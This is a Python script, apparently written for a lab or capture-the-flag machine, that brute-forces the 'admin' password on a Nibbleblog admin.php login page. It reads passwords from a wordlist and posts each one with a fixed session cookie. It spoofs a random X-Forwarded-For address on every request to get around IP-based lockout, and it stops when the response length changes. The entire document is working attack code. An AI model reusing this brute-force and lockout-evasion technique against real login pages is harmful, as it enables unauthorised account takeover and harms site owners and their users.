import requests
from faker import Faker  
faker = Faker()  
ip_addr = faker.ipv4()  
print(ip_addr)

# Using readlines()
file1 = open('probable-v2-top12000.txt', 'r')
Lines = file1.readlines()
Lines = [x.strip() for x in Lines] 
 
count = 0
# Strips the newline character
for line in Lines:
    cookies = {
        'PHPSESSID': '6942988dr1r9rkh8nl60b2c473',
    }
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://10.129.185.188',
        'Connection': 'keep-alive',
        'Referer': 'http://10.129.185.188/nibbleblog/admin.php',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': faker.ipv4(),
    }
    
    data = {
      'username': 'admin',
      'password': line
    }
    
    response = requests.post('http://10.129.185.188/nibbleblog/admin.php', headers=headers, cookies=cookies, data=data)
    if(len(response.content) == 1541):
        print(line + " " + str(len(response.content)))
    else:   
        print(line + " " + str(len(response.content)) + " -----------------------------------------------------------------------------")
        quit()    


